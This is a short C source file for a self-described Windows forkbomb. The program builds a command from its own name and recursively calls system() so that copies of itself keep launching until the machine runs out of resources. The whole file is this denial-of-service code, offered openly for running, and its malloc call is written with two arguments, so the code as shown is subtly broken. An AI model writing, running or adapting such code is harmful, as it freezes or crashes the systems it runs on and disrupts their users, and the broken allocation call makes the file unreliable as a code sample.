#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>
#include <string.h>

char * cmd;
noreturn inline static void forkbomb(void);

int main (int argc,char * argv[]) {
  if (argc != 1) {
    if (strcmp(argv[1],"-h") == 0 || strcmp(argv[1],"--help") == 0) {
      printf("This is a forkbomb for windows,\n"
             "\t-h,--help: show this help;\n"
             "\tdefault: run forkbomb.\n");
      return 4;
    }
  }
  if ((cmd = malloc((size_t)strlen(argv[0])+(size_t)3,sizeof(char))) != NULL) {
	  {
		register size_t len;
		register char * temp = memcpy(cmd,*argv,len=strlen(argv[0]));
		temp[len] = ' ';
		temp[++len] = '&';
		temp[++len] = '\0';
	  }
	forkbomb();
  } else
    printf("Memory alloc failed.\n");
  return 1;
}

noreturn inline static void forkbomb(void) {
  system(cmd);
  forkbomb();
}
